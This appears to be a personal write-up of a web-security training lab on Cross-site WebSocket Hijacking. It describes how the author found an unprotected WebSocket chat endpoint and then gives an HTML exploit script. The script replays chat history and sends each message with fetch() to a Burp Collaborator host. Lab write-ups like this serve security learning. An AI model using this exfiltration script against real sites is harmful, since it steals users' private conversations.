@@ -1,0 +1,46 @@
+ Cross-site WebSocket Hijacking
+
+**Category**: WebSockets  
+**Difficulty**: Practitioner  
+
+---
+
+## Overview / What I Learned
+
+- This lab demonstrates how WebSocket connections that lack proper origin checks or authentication mechanisms are vulnerable to Cross-site WebSocket Hijacking (CSWSH).
+- I learned how to abuse an exposed WebSocket endpoint by initiating the connection from a different origin and exfiltrating sensitive data through it.
+- The attack works because the server does not validate the origin of the WebSocket handshake or the messages sent over it.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Initial Analysis
+- Explored the application and found a live chat feature using WebSockets.
+- Sent a test message and observed WebSocket traffic in Burp Suite under the WebSockets tab.
+- Discovered that sending the `READY` command returns the full chat history including prior messages.
+- Verified that the WebSocket handshake had no CSRF protection or origin header check.
+
+### 2. Payload Preparation
+- Copied the WebSocket URL from the handshake request:  
+  Example: `wss://labId.web-security-academy.net/chat`
+- Generated a Burp Collaborator payload to receive exfiltrated messages.
+
+### 3. Exploit Script
+
+Uploaded the following script to the exploit server:
+
+```html
+<script>
+    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://YOUR-COLLABORATOR-ID.burpcollaborator.net', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: event.data
+        });
+    };
+</script>
